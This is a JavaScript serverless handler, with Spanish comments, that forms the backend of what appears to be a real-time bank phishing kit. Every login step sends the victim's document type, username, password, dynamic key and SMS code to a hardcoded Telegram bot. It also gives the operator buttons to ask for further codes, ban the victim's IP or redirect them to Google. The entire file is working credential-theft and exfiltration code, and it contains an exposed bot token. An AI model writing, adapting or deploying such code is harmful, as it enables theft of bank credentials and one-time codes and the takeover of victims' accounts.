// api/send.js
export default async function handler(req, res) {
  // 1. Configurar CORS para que tu frontend pueda llamar a esta API
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  // 2. Manejar preflight request (CORS)
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // 3. Solo aceptar POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  // 4. Extraer datos del cuerpo de la petición
  const { tipoDoc, usuario, clave, dynamicCode, smsCode, action } = req.body;

  // Configuración de Telegram
  const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
  const TG_CHAT_ID = '7776240161';
  const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;

  let mensaje = '';
  let keyboard = { inline_keyboard: [] };

  // 5. Construir el mensaje según la acción
  if (action === 'login') {
    mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n📄 <b>Tipo doc:</b> <code>${tipoDoc}</code>\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
    keyboard = {
      inline_keyboard: [
        [
          { text: '❌ Usuario Malo', callback_data: 'error_usuario' },
          { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }
        ],
        [
          { text: '🚫 Banear IP', callback_data: 'banear_ip' },
          { text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }
        ]
      ]
    };
  } else if (action === 'dinamica') {
    mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔢 <b>Dinámica:</b> <code>${dynamicCode}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
    keyboard = {
      inline_keyboard: [
        [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
        [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
      ]
    };
  } else if (action === 'sms') {
    mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n📩 <b>SMS:</b> <code>${smsCode}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
    keyboard = {
      inline_keyboard: [
        [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
        [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
        [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
      ]
    };
  }

  // 6. Enviar a Telegram
  try {
    const tgResponse = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TG_CHAT_ID,
        text: mensaje,
        parse_mode: 'HTML',
        reply_markup: keyboard
      })
    });

    const data = await tgResponse.json();
    return res.status(200).json(data);
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
